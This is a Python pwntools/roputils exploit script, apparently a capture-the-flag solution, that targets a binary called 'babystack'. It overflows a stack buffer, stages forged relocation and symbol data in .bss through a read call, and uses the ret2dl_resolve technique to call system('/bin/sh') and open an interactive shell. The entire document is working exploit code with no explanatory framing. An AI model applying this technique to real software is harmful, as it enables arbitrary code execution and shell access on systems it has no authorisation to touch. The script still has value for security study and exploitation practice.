import roputils
from pwn import *

elf=ELF('./babystack')
sh=process('./babystack')

offset=0x28+4
bss_addr=elf.bss()
sub_addr=0x0804843B
read_addr=elf.plt['read']

#create another read
payload='A'*offset
payload+=p32(read_addr)+p32(sub_addr)+p32(0)+p32(bss_addr)+p32(100)
sh.send(payload)

#create REL & SYM in bss
rop=roputils.ROP('./babystack')
payload=rop.string("/bin/sh\x00")
payload+=rop.fill(20,payload)
payload+=rop.dl_resolve_data(bss_addr+20,'system')
payload+=rop.fill(100,payload)
sh.send(payload)

#rob eip to plt[0]
payload='A'*offset+rop.dl_resolve_call(bss_addr+20,bss_addr)
sh.send(payload)
sh.interactive()